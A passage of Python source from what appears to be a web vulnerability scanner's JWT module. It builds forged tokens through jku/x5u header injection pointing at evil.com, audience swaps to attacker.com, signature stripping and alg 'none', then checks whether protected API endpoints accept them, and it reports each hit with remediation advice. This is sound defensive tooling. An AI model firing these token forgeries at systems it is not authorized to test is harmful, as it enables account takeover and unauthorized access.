                            description=f"Server accepts tokens with manipulated 'jku' header pointing to {jku_url}. "
                                       "Attacker can redirect key fetching to their server and forge tokens.",
                            token_location=token.location,
                            original_token=token.raw,
                            manipulated_token=jku_token,
                            evidence=f"Token with jku={jku_url} was accepted",
                            remediation="Validate jku URLs against an allowlist of trusted key providers. "
                                       "Never fetch keys from arbitrary URLs specified in the token.",
                            cwe_id="CWE-346",  # Origin Validation Error
                            cvss_score=9.5,
                        ),
                        target=target,
                    )
                    logger.warning(f"[JWT Scanner] CRITICAL: JKU injection successful with {jku_url}")
                    break
        except Exception as e:
            logger.debug(f"[JWT Scanner] JKU injection test error: {e}")

        # ==================================================================
        # ATTACK 3: X5U (X.509 URL) Injection
        # Redirect x5u to attacker-controlled certificate URL
        # ==================================================================
        try:
            x5u_test_urls = [
                f"https://evil.com/{secrets.token_hex(8)}/cert.pem",
                "https://localhost/cert.pem",
                f"{target}/../../../evil/cert.pem",
            ]

            for x5u_url in x5u_test_urls[:2]:
                x5u_token = self._create_x5u_injection_token(token, x5u_url)
                if x5u_token and await self._test_token_accepted(target, x5u_token, token):
                    self._add_finding(
                        title="JWT X5U Injection - Certificate URL Redirect",
                        severity=Severity.CRITICAL,
                        vulnerability=JWTVulnerability(
                            attack_type=JWTAttackType.X5U_INJECTION,
                            severity=Severity.CRITICAL,
                            description=f"Server accepts tokens with manipulated 'x5u' header pointing to {x5u_url}. "
                                       "Attacker can redirect certificate fetching to their server.",
                            token_location=token.location,
                            original_token=token.raw,
                            manipulated_token=x5u_token,
                            evidence=f"Token with x5u={x5u_url} was accepted",
                            remediation="Validate x5u URLs against an allowlist. "
                                       "Use certificate pinning instead of URL-based certificate fetching.",
                            cwe_id="CWE-346",
                            cvss_score=9.5,
                        ),
                        target=target,
                    )
                    logger.warning(f"[JWT Scanner] CRITICAL: X5U injection successful with {x5u_url}")
                    break
        except Exception as e:
            logger.debug(f"[JWT Scanner] X5U injection test error: {e}")

    def _create_embedded_jwk_token(self, token: JWTToken) -> str | None:
        """Create a token with embedded JWK containing attacker's key."""
        try:
            # Generate a simple RSA-like test key (for detection purposes)
            # In real attack, this would be a proper RSA key
            fake_jwk = {
                "kty": "RSA",
                "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
                "e": "AQAB",
                "alg": "RS256",
                "use": "sig"
            }

            # Create new header with embedded JWK
            new_header = token.header.copy()
            new_header["jwk"] = fake_jwk
            new_header["alg"] = "RS256"

            # Create token with modified header (unsigned - tests if server validates)
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(new_header).encode()
            ).decode().rstrip("=")

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(token.payload).encode()
            ).decode().rstrip("=")

            # Fake signature (server should reject if properly validating)
            fake_sig = base64.urlsafe_b64encode(b"fake_signature_for_detection").decode().rstrip("=")

            return f"{header_b64}.{payload_b64}.{fake_sig}"
        except Exception as e:
            logger.debug(f"[JWT Scanner] Error creating embedded JWK token: {e}")
            return None

    def _create_jku_injection_token(self, token: JWTToken, jku_url: str) -> str | None:
        """Create a token with injected jku (JWK Set URL) header."""
        try:
            new_header = token.header.copy()
            new_header["jku"] = jku_url

            header_b64 = base64.urlsafe_b64encode(
                json.dumps(new_header).encode()
            ).decode().rstrip("=")

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(token.payload).encode()
            ).decode().rstrip("=")

            # Keep original signature (to test if server even checks jku)
            original_parts = token.raw.split(".")
            if len(original_parts) == 3:
                return f"{header_b64}.{payload_b64}.{original_parts[2]}"

            return None
        except Exception as e:
            logger.debug(f"[JWT Scanner] Error creating JKU injection token: {e}")
            return None

    def _create_x5u_injection_token(self, token: JWTToken, x5u_url: str) -> str | None:
        """Create a token with injected x5u (X.509 URL) header."""
        try:
            new_header = token.header.copy()
            new_header["x5u"] = x5u_url

            header_b64 = base64.urlsafe_b64encode(
                json.dumps(new_header).encode()
            ).decode().rstrip("=")

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(token.payload).encode()
            ).decode().rstrip("=")

            original_parts = token.raw.split(".")
            if len(original_parts) == 3:
                return f"{header_b64}.{payload_b64}.{original_parts[2]}"

            return None
        except Exception as e:
            logger.debug(f"[JWT Scanner] Error creating X5U injection token: {e}")
            return None

    async def _test_nbf_bypass(self, target: str, token: JWTToken) -> None:
        """Test for 'not before' (nbf) claim bypass."""
        # Check if token has nbf claim
        if "nbf" not in token.payload:
            return

        # Create token with nbf in the past (should be valid) and in the future (should fail)
        future_nbf_payload = token.payload.copy()
        future_nbf_payload["nbf"] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year in future

        # Create token with future nbf
        future_token = self.manipulator.create_token(
            token.header, future_nbf_payload, algorithm="none"
        )

        if await self._test_token_accepted(target, future_token, token):
            self._add_finding(
                title="JWT NBF (Not Before) Validation Bypass",
                severity=Severity.MEDIUM,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.NBF_BYPASS,
                    severity=Severity.MEDIUM,
                    description="Server accepts tokens with 'nbf' (not before) claim set in the future. "
                               "This indicates the nbf claim is not being validated.",
                    token_location=token.location,
                    original_token=token.raw,
                    manipulated_token=future_token,
                    evidence="Token with future nbf claim was accepted",
                    remediation="Validate the nbf claim and reject tokens before their validity period",
                    cwe_id="CWE-294",
                    cvss_score=5.0,
                ),
                target=target,
            )

    async def _test_audience_confusion(self, target: str, token: JWTToken) -> None:
        """Test for audience (aud) claim confusion."""
        if "aud" not in token.payload:
            return

        original_aud = token.payload.get("aud")

        # Test with different audiences
        test_audiences = [
            "attacker.com",
            "https://evil.com",
            "*",
            ["attacker.com", original_aud] if isinstance(original_aud, str) else original_aud,
            "",
        ]

        for test_aud in test_audiences[:3]:
            modified_payload = token.payload.copy()
            modified_payload["aud"] = test_aud

            tampered_token = self.manipulator.create_token(
                token.header, modified_payload, algorithm="none"
            )

            if await self._test_token_accepted(target, tampered_token, token):
                self._add_finding(
                    title="JWT Audience (aud) Validation Bypass",
                    severity=Severity.HIGH,
                    vulnerability=JWTVulnerability(
                        attack_type=JWTAttackType.AUDIENCE_CONFUSION,
                        severity=Severity.HIGH,
                        description=f"Server accepts tokens with modified 'aud' (audience) claim. "
                                   f"Original: {original_aud}, Accepted: {test_aud}. "
                                   f"This allows tokens issued for other services to be accepted.",
                        token_location=token.location,
                        original_token=token.raw,
                        manipulated_token=tampered_token,
                        evidence=f"Token with aud='{test_aud}' was accepted",
                        remediation="Validate the aud claim against expected audience values. "
                                   "Reject tokens not intended for this service.",
                        cwe_id="CWE-287",
                        cvss_score=7.0,
                    ),
                    target=target,
                )
                break

    async def _test_signature_stripping(self, target: str, token: JWTToken) -> None:
        """Test for signature stripping attacks."""
        parts = token.raw.split(".")
        if len(parts) != 3:
            return

        # Test 1: Empty signature (header.payload.)
        empty_sig_token = f"{parts[0]}.{parts[1]}."

        if await self._test_token_accepted(target, empty_sig_token, token):
            self._add_finding(
                title="JWT Signature Stripping - Empty Signature Accepted",
                severity=Severity.CRITICAL,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.SIGNATURE_STRIPPING,
                    severity=Severity.CRITICAL,
                    description="Server accepts JWT tokens with empty signature. "
                               "This allows attackers to forge any token by simply omitting the signature.",
                    token_location=token.location,
                    original_token=token.raw,
                    manipulated_token=empty_sig_token,
                    evidence="Token with empty signature was accepted",
                    remediation="Always verify JWT signature. Reject tokens with missing or empty signatures.",
                    cwe_id="CWE-347",
                    cvss_score=9.8,
                ),
                target=target,
            )
            return

        # Test 2: Truncated signature
        truncated_sig = parts[2][:10] if len(parts[2]) > 10 else parts[2][:2]
        truncated_token = f"{parts[0]}.{parts[1]}.{truncated_sig}"

        if await self._test_token_accepted(target, truncated_token, token):
            self._add_finding(
                title="JWT Signature Stripping - Truncated Signature Accepted",
                severity=Severity.CRITICAL,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.SIGNATURE_STRIPPING,
                    severity=Severity.CRITICAL,
                    description="Server accepts JWT tokens with truncated signature. "
                               "Signature validation is not properly implemented.",
                    token_location=token.location,
                    original_token=token.raw,
                    manipulated_token=truncated_token,
                    evidence="Token with truncated signature was accepted",
                    remediation="Implement proper signature length validation. Use established JWT libraries.",
                    cwe_id="CWE-347",
                    cvss_score=9.5,
                ),
                target=target,
            )

    def _check_token_lifetime(self, target: str, token: JWTToken) -> None:
        """Check for excessive token lifetime (security hygiene)."""
        exp = token.payload.get("exp")
        iat = token.payload.get("iat")

        if not exp:
            # Already covered in _analyze_token
            return

        now = time.time()
        remaining = exp - now

        # Calculate lifetime
        if iat:
            lifetime = exp - iat
        else:
            lifetime = remaining

        # Check for excessively long-lived tokens
        if lifetime > 7 * 24 * 60 * 60:  # > 7 days
            days = int(lifetime / (24 * 60 * 60))
            self._add_finding(
                title="JWT Token Has Excessive Lifetime",
                severity=Severity.MEDIUM,
                vulnerability=JWTVulnerability(
                    attack_type=JWTAttackType.LONG_LIVED_TOKEN,
                    severity=Severity.MEDIUM,
                    description=f"JWT token has a lifetime of {days} days. "
                               f"Long-lived tokens increase the window of opportunity for token theft. "
                               f"If compromised, attackers have extended access.",
                    token_location=token.location,
                    original_token=token.raw,
                    evidence=f"Token lifetime: {days} days ({int(lifetime)} seconds)",
                    remediation="Use short-lived access tokens (5-30 minutes) with refresh token rotation. "
                               "Implement token revocation mechanism.",
                    cwe_id="CWE-613",
                    cvss_score=4.3,
                ),
                target=target,
            )
        elif lifetime > 24 * 60 * 60:  # > 24 hours
            hours = int(lifetime / 3600)
            if hours >= 12:  # Only report if >= 12 hours
                self._add_finding(
                    title="JWT Token Has Long Lifetime",
                    severity=Severity.LOW,
                    vulnerability=JWTVulnerability(
                        attack_type=JWTAttackType.LONG_LIVED_TOKEN,
                        severity=Severity.LOW,
                        description=f"JWT token has a lifetime of {hours} hours. "
                                   f"Consider using shorter access tokens with refresh rotation.",
                        token_location=token.location,
                        original_token=token.raw,
                        evidence=f"Token lifetime: {hours} hours",
                        remediation="Consider shorter token lifetimes (15-60 minutes) for sensitive applications.",
                        cwe_id="CWE-613",
                        cvss_score=2.7,
                    ),
                    target=target,
                )

    async def _test_token_accepted(
        self,
        target: str,
        test_token: str,
        original_token: JWTToken,
    ) -> bool:
        """Test if a manipulated token is accepted by the server.

        AUDIT-FIX 2026-02-11: Test against protected API endpoints, not root URL.
        SPAs return 200 for root regardless of auth, causing false positives.
        Now compares response bodies for user-specific data.
        """
        try:
            # AUDIT-FIX: Protected endpoints that require auth
            # Root URL always returns 200 for SPAs - useless for testing
            protected_endpoints = [
                "/api/Users/me",
                "/rest/user/whoami",
                "/api/profile",
                "/api/v1/user",
                "/api/v1/me",
                "/api/account",
                "/api/user",
                "/user/me",
                "/me",
            ]

            # Try different auth header locations
            locations = [
                ("Authorization", f"Bearer {test_token}"),
                ("X-Auth-Token", test_token),
                ("Cookie", f"token={test_token}"),
            ]

            # User data indicators that confirm successful auth
            user_data_indicators = [
                "email", "username", "user_id", "userId", "id",
                "name", "role", "admin", "created", "profile",
            ]

            for header_name, header_value in locations:
                test_headers = {header_name: header_value}
                orig_header_value = f"Bearer {original_token.raw}" if "Bearer" in header_value else original_token.raw
                orig_headers = {header_name: orig_header_value}

                for endpoint in protected_endpoints:
                    try:
                        await self.rate_limiter.acquire()
                        test_url = urljoin(target, endpoint)

                        # Get response with manipulated token
                        test_response = await self.client.get(
                            test_url, headers=test_headers, timeout=10.0
                        )

                        # Skip if endpoint doesn't exist or returns error
                        if test_response.status_code in [404, 405, 500, 502, 503]:
                            continue

                        # If we get 401/403, the token was rejected - good
                        if test_response.status_code in [401, 403]:
                            continue

                        # Got 200 - need to verify it's actually authenticated
                        if test_response.status_code in [200, 201, 204]:
                            test_text = test_response.text.lower()

                            # AUDIT-FIX: Check for user-specific data, not just status
                            has_user_data = any(
                                ind in test_text for ind in user_data_indicators
                            )

                            # Also verify original token gets similar response
                            await self.rate_limiter.acquire()
                            orig_response = await self.client.get(
                                test_url, headers=orig_headers, timeout=10.0
                            )

                            if orig_response.status_code in [200, 201, 204]:
                                orig_text = orig_response.text.lower()
                                orig_has_user_data = any(
                                    ind in orig_text for ind in user_data_indicators
                                )

                                # Both have user data = manipulated token accepted
                                if has_user_data and orig_has_user_data:
                                    logger.debug(
                                        f"[JWT Scanner] Manipulated token accepted at {endpoint}"
                                    )
                                    return True

                    except Exception as e:
                        logger.debug(f"[JWT Scanner] Error testing {endpoint}: {e}")
                        continue

        except Exception as e:
            logger.debug(f"[JWT Scanner] Token test error: {e}")

        return False

    async def _test_forged_token(
        self,
        target: str,
        forged_token: str,
        original_location: str,
    ) -> bool:
        """
        Test if a forged token is accepted by the server.

        P0 FIX 2026-02-11: Method was called but never implemented.
        Used in algorithm confusion testing to verify forged tokens work.

        AUDIT-FIX 2026-02-11: Test against protected API endpoints, not root URL.
        SPAs return 200 for root regardless of auth, causing false positives.

        Args:
            target: Target URL to test against
            forged_token: The forged JWT token string
            original_location: Where the original token was found (header, cookie, param)

        Returns:
            True if forged token is accepted, False otherwise
        """
        # AUDIT-FIX: Protected endpoints that require auth
        protected_endpoints = [
            "/api/Users/me",
            "/rest/user/whoami",
            "/api/profile",
            "/api/v1/user",
            "/api/v1/me",
            "/api/account",
            "/api/user",
            "/user/me",
            "/me",
        ]

        # User data indicators that confirm successful auth
        user_data_indicators = [
            "email", "username", "user_id", "userId", "id",
            "name", "role", "admin", "created", "profile",
        ]

        try:
            # Build headers based on original location
            headers = {}
            location_lower = original_location.lower() if original_location else ""

            if "cookie" in location_lower:
                headers["Cookie"] = f"token={forged_token}; jwt={forged_token}; access_token={forged_token}"
            elif "x-auth" in location_lower or "x-token" in location_lower:
                headers["X-Auth-Token"] = forged_token
                headers["X-Token"] = forged_token
            else:
                # Default to Authorization header
                headers["Authorization"] = f"Bearer {forged_token}"

            for endpoint in protected_endpoints:
                try:
                    await self.rate_limiter.acquire()
                    test_url = urljoin(target, endpoint)

                    response = await self.client.get(test_url, headers=headers, timeout=10.0)

                    # Skip if endpoint doesn't exist or returns error
                    if response.status_code in [404, 405, 500, 502, 503]:
                        continue

                    # If we get 401/403, the forged token was rejected - expected
                    if response.status_code in [401, 403]:
                        continue

                    # Got 200 - need to verify it actually authenticated
                    if response.status_code in [200, 201, 204]:
                        response_text = response.text.lower()

                        # AUDIT-FIX: Check for user-specific data, not generic indicators
                        has_user_data = any(
                            ind in response_text for ind in user_data_indicators
                        )

                        # Also check for explicit error indicators
                        error_indicators = [
                            "invalid", "expired", "unauthorized", "forbidden",
                            "denied", "failed", "invalid token", "not authenticated"
                        ]
                        has_error = any(
                            ind in response_text for ind in error_indicators
                        )

                        # Forged token accepted if has user data and no error
                        if has_user_data and not has_error:
                            logger.debug(
                                f"[JWT Scanner] Forged token accepted at {endpoint}"
                            )
                            return True

                except Exception as e:
                    logger.debug(f"[JWT Scanner] Error testing {endpoint}: {e}")
                    continue

        except Exception as e:
            logger.debug(f"[JWT Scanner] Forged token test error: {e}")

        return False

    def _add_finding(
        self,
        title: str,
        severity: str,
        vulnerability: JWTVulnerability,
        target: str,
    ) -> None:
        """Add a finding to the results."""
        # Determine confidence based on severity
        severity_confidence_map = {
            "critical": 95,
            "high": 90,
            "medium": 85,
            "low": 80,
            "info": 100,
        }
        confidence = severity_confidence_map.get(severity.lower(), 85)
        
        finding = Finding(
            name=title,  # Finding uses 'name' not 'title'
            vuln_type=VulnType.JWT_VULNERABILITY,
            severity=severity,
            host=target,
            endpoint=target,  # Finding uses 'matched_at' not 'url'
            description=vulnerability.description,
            evidence=vulnerability.evidence if isinstance(vulnerability.evidence, list) else [vulnerability.evidence] if vulnerability.evidence else [],
            remediation=vulnerability.remediation,
            cwe_id=vulnerability.cwe,
            cvss_score=vulnerability.cvss_score,
            confidence_score=confidence,
            metadata={
                "module": self.MODULE_NAME,
                "attack_type": vulnerability.attack_type.value,
                "token_location": vulnerability.token_location,
                "original_token": vulnerability.original_token[:50] + "...",
                "manipulated_token": (vulnerability.manipulated_token[:50] + "...") if vulnerability.manipulated_token else None,
            },
        )
        self.findings.append(finding)
        logger.info(f"[JWT Scanner] Found: {title} ({severity})")


# =============================================================================
# MODULE TEST
# =============================================================================

if __name__ == "__main__":
    import asyncio

    async def test_jwt_scanner():
        """Test the JWT scanner."""
        print("=" * 60)
        print("PHANTOM AI - JWT Security Scanner Test")
        print("=" * 60)

        scanner = JWTScanner()

        # Test token parsing
        test_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

        token = JWTToken.parse(test_token, "test")
        if token:
            print(f"\n✅ Token parsed successfully")
            print(f"   Algorithm: {token.get_algorithm()}")
            print(f"   Claims: {list(token.get_claims().keys())}")
            print(f"   Expired: {token.is_expired()}")

        # Test manipulator
        manipulator = JWTManipulator()

        # Test none algorithm
        none_token = manipulator.create_none_algorithm_token(token)
        print(f"\n🔧 None Algorithm Token:")
        print(f"   {none_token[:60]}...")

        # Test weak secret detection
        print(f"\n🔐 Weak Secret Test:")
        is_weak = manipulator.verify_hmac_signature(token, "secret")
        print(f"   Secret 'secret' matches: {is_weak}")

        # Test mutation chain
        mutation = manipulator.get_mutation_chain(token) if hasattr(manipulator, 'get_mutation_chain') else None

        print("\n" + "=" * 60)
        print("✅ JWT Scanner test complete!")
        print("=" * 60)

    asyncio.run(test_jwt_scanner())
